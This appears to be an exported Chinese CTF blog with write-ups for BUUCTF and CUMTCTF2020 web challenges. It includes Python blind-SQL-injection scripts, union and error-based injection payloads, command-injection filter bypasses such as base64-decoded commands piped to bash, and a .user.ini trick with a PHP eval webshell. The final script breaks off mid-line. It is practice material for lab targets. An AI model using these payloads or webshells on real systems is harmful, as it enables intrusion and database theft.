$blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>找了好长时间，找不到注入点</p>
<p>后来发现，登录之后，可以查看一些信息</p>
<p>并且很重要的是view.php中no是可以注入的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Fatal"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br><span class="line">payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line"><span class="comment">#users</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name="users"),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:11;s:4:"blog";s:8:"pz1o.top";&#125;</span></span><br></pre></td></tr></table></figure>
<p>其实也可以报错注入，但当时以为0x7e被ban了之后就不能报错了，tcl</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1%20and%20extractvalue(1,concat(%27$%27,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">database</span>()))))%<span class="number">23</span></span><br><span class="line">fakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>())))%<span class="number">23</span></span><br><span class="line"><span class="keyword">users</span></span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_name=%<span class="number">27</span><span class="keyword">users</span>%<span class="number">27</span>)))%<span class="number">23</span></span><br><span class="line"><span class="keyword">no</span>,username,passwd,<span class="keyword">data</span>,<span class="keyword">USER</span>,CU</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span> extractvalue(%<span class="number">27</span>$%<span class="number">27</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span> <span class="keyword">data</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>做到这其实就不会做了。。。看大师傅的wp才知道可以no参数注入反序列化</p>
<p>其中payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure>
<p>至于为什么会想到这个，首先data中就是反序列化的字符串，并且，最后一个blog内容会被显示出来，这样就希望从blog中获得flag</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="GXYCTF2019-Ping-Ping-Ping（过滤空格和有黑名单）"><a href="#GXYCTF2019-Ping-Ping-Ping（过滤空格和有黑名单）" class="headerlink" title="[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）"></a>[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）</h2><p>直接ping命令执行</p>
<p>用分号执行两个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;8.8.8.8;ls</span><br></pre></td></tr></table></figure>
<p>查看有flag.php，重要的就是怎么去读取flag.php</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200831111916451.png" alt="image-20200831111916451"></p>
<p><strong>这里发现过滤了空格，所以绕过空格的办法，简单来说有两种</strong>，第一种是${IFS}</p>
<ol>
<li><p>```<br>root@kali:~# cat flag<br>this is your flag<br>root@kali:~# cat${IFS}flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat${IFS}$1flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat$IFS$1flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">第二种呢是重定向符</span><br><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat&lt;&gt;flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat&lt;flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这里呢我们选用$&#123;IFS&#125;来绕过，之后又发现&#123;&#125;被过滤，所以用第三个方式</span><br><span class="line"></span><br><span class="line">![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)</span><br><span class="line"></span><br><span class="line">这时，我们发现flag也被过滤了，所以**黑名单绕过又有几种方式**</span><br><span class="line"></span><br><span class="line">1. 拼接</span><br></pre></td></tr></table></figure>
<p>root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$d<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. base64编码</span><br></pre></td></tr></table></figure>
<p>root@kali:~# <code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>this is your flag</p>
<p>root@kali:~# echo “Y2F0IGZsYWc=”|base64 -d|bash<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. 单引号、双引号</span><br></pre></td></tr></table></figure>
<p>root@kali:~# c””at fl’’ag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. 反斜线</span><br></pre></td></tr></table></figure>
<p>root@kali:~# c\at fl\ag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这里直接拼接过去就好</span><br></pre></td></tr></table></figure>
<p>?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">即可拿到flag</span><br><span class="line"></span><br><span class="line">**主要是绕过空格和绕过黑名单**</span><br><span class="line"></span><br><span class="line">## [RoarCTF 2019]Easy Calc（php字符串解析）</span><br><span class="line"></span><br><span class="line">打开源码，发现calc.php ，然后访问calc.php</span><br><span class="line"></span><br><span class="line">![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)</span><br><span class="line"></span><br><span class="line">num变量过滤了一些东西，但我们用一些函数去访问时，会发现403拒绝访问，说明有waf</span><br><span class="line"></span><br><span class="line">通过网上查找，是**php的字符串解析特性**</span><br><span class="line"></span><br><span class="line">&gt; PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span><br><span class="line">&gt;</span><br><span class="line">&gt; 1.删除空白符 </span><br><span class="line">&gt;</span><br><span class="line">&gt; 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</span><br><span class="line"></span><br><span class="line">先试一试phpinfo();可以用说明我们就成功了。</span><br><span class="line"></span><br><span class="line">接下来，就是读取目录，找flag了，从phpinfo中我们可以看见一些外部函数被ban了</span><br><span class="line"></span><br><span class="line">这时就需要介绍以下几个函数</span><br><span class="line"></span><br><span class="line">1. **scandir() 函数**:</span><br><span class="line">   返回指定目录中的文件和目录的数组。</span><br><span class="line"></span><br><span class="line">2. **base_convert(number,formbase,tobase) 函数**:</span><br><span class="line"></span><br><span class="line">   在任意进制之间转换数字。</span><br><span class="line"></span><br><span class="line">3. **dechex() 函数**：</span><br><span class="line"></span><br><span class="line">   把十进制转换为十六进制。</span><br><span class="line"></span><br><span class="line">4. **hex2bin() 函数**：</span><br><span class="line"></span><br><span class="line">   把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"></span><br><span class="line">5. **readfile() 函数**:</span><br><span class="line"></span><br><span class="line">   输出一个文件。</span><br><span class="line"></span><br><span class="line">6. **chr()函数**</span><br><span class="line"></span><br><span class="line">   十进制返回ascii字符</span><br><span class="line"></span><br><span class="line">7. **ord()函数**</span><br><span class="line"></span><br><span class="line">   ascii字符转换为十进制</span><br><span class="line"></span><br><span class="line">8. **file_get_contents()**</span><br><span class="line"></span><br><span class="line">   把文件读入一个字符串中</span><br><span class="line"></span><br><span class="line">通常会用hex2bin(dechex(47))一起使用，这个表示&#x2F;</span><br><span class="line"></span><br><span class="line">这里&#x2F;被过滤了</span><br><span class="line"></span><br><span class="line">所以payload可以为</span><br></pre></td></tr></table></figure>
<p>? num=var_dump(scandir(chr(47)))<br>? num=var_dump(scandir(hex2bin(dechex(47))))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">发现flag直接readfile读取即可</span><br></pre></td></tr></table></figure>
<p>? num=var_dump(readfile(chr(47).f1agg))<br>? num=file_get_contents(chr(47).f1agg)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">还有其他的payload</span><br></pre></td></tr></table></figure>
<p>? num=base_convert(55490343972,10,36)()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## [ACTF2020 新生赛]Exec</span><br><span class="line"></span><br><span class="line">直接查就可以</span><br></pre></td></tr></table></figure>
<p>8.8.8.8;ls /<br>8.8.8.8;cat /flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## [极客大挑战 2019]Http</span><br><span class="line"></span><br><span class="line">改请求包xff，ua，ref。</span><br></pre></td></tr></table></figure>
<p>GET /Secret.php HTTP/1.1<br>Host: node3.buuoj.cn:28918<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Syclover<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>referer: <a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br>X-Forwarded-for: 127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 文件上传</span><br><span class="line"></span><br><span class="line">## [SUCTF 2019]CheckIn（.user.ini）</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;这个是初始目录</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true); &#x2F;&#x2F;如果不存在，就将创建目录可写可执行</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;  &#x2F;&#x2F;判断是否存在上传文件</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;  &#x2F;&#x2F;文件名不许为空</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;截取后缀名</span><br><span class="line">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);  &#x2F;&#x2F;正则匹配，ph和htaccess都不可以</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">        die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;文件内容不许有&lt;?</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type &#x3D; exif_imagetype($tmp_name);  &#x2F;&#x2F;判断一个图像的类型</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>源码如上，可以学习一下</p>
<p><strong>其中exif_imagetype()可以记录一下</strong></p>
<blockquote>
<p>但我们可以通过给上传脚本加上相应的幻数头字节就可以绕过：</p>
<ul>
<li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li>
<li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li>
<li>PNG： 89 50 4E 47</li>
</ul>
</blockquote>
<p>这里想要上传成功，要借助一下.user.ini</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>其中有两个配置，可以用来制造后门：<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>
<p>那么当我们访问此目录下的任何一个文件时，都会去包含test.jpg</p>
<p>常见姿势：</p>
<p>比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 </p>
</blockquote>
<p>这里最后就要写一个图片马了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>然后把两个上传，连菜刀就可以拿到flag了</p>
<p><strong>主要来学习一下文件上传的操作</strong></p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>这个直接上传就可以，改一下文件内容的头，然后改下文件名phtml</p>
<p>菜刀连接拿flag</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>备份文件index.php.bak</p>
<p>两个等号弱等于，直接123拿flag</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传改名字，拿flag</p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>直接菜刀连接，根目录下有flag</p>
]]></content>
      <categories>
        <category>BUU</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMTCTF2020</title>
    <url>/2020/09/25/CUMTCTF2020/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><p>第一次打比赛，大三的师傅们好强</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p><img src="/2020/09/25/CUMTCTF2020/image-20200925183359837.png" alt="image-20200925183359837"></p>
<p>get传入参数1，post传入参数2，然后文件包含flag.php，查看源码拿flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h2><p>过滤空格的sql注入，可以用/**/绕过,用union注入</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查表</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8#</span><br><span class="line">#emails,users</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8#</span><br><span class="line">#id,email_id</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8#</span><br><span class="line">#user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8#</span><br><span class="line">#CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg</span><br></pre></td></tr></table></figure>
<p>直接看图片的源代码，发现后面有php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param1'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $str1=$_GET[<span class="string">'param1'</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents($str1)!==<span class="string">'Suvin_wants_a_girlfriend'</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Suvin doesn't like you"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">        $str2=$_GET[<span class="string">'param2'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($str2))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin prefers strings of Numbers'</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($str2&lt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">30</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin says the num is too short'</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($str2&gt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">31</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin says the num is too long'</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Suvin says he's falling in love with you!"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            sleep(intval($str2)); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'param1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">            $str1=$_POST[<span class="string">'param1'</span>];</span><br><span class="line">            $str2=$_POST[<span class="string">'param2'</span>];</span><br><span class="line">            <span class="keyword">if</span>(strlen($str1)&gt;<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"It's too long"</span>);</span><br><span class="line">            <span class="keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"It's so similar to md5"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先get传入param1要和一个字符串相等可以用data://</p>
<p>get传入param2要判断这个参数是否是数字并且要限制了范围，在加上有sleep，很自然的就想到了科学计数法</p>
<p>因此payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend</span><br></pre></td></tr></table></figure>
<p>接下来是post的两个参数要的是字符串下的参数1和参数2不强等，但sha1加密强等，这里就不能用zhe数组绕过了</p>
<p>这里找两个sha1加密的不一样的字符串,找的是那个pdf，然后提取前面的内容即可，最后抓包改参数1和参数2拿flag</p>
<p><img src="/2020/09/25/CUMTCTF2020/image-20200925185006355.png" alt="image-20200925185006355"></p>
<h2 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h2><p>过滤了<strong>单引号和字符串截断函数substr()和mid()</strong>并且无回显，因为有正确和错误登录界面那应该就是盲注了</p>
<p>这里用left来截取字符串，并且用十六进制来替换单引号及其里面的内容</p>
<p>直接放脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'</span></span><br><span class="line">dict=<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">'http://202.119.201.197:13004/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">j = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dict:</span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i, binascii.b2a_hex(j + a))</span></span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i,binascii.b2a_hex(j+a))</span></span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i,binascii.b2a_hex(j + a))</span></span><br><span class="line">        payload = <span class="string">"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#"</span>.format(i, binascii.b2a_hex(j + a))</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="comment">#cumtctf</span></span><br><span class="line">        <span class="comment">#emails users</span></span><br><span class="line">        <span class="comment">#id id username,password</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span> : <span class="string">"100\\"</span>,</span><br><span class="line">            <span class="string">'password'</span> : payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.session()</span><br><span class="line">        res = 